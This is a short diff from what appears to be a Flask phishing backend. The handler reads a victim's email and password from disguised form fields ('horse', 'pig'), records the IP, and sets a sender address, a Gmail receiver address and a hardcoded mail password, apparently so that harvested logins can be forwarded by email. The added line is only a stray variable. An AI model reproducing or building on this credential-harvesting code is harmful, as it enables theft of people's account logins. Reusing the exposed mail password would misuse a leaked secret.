@@ -217,6 +217,7 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
+        sender_emaill = 'contact'
         sender_email = 'contact@domainshieldtech.bio'
         receiver_email = 'roshniashonka@gmail.com'
         password = 'vip5071dc7bc887'
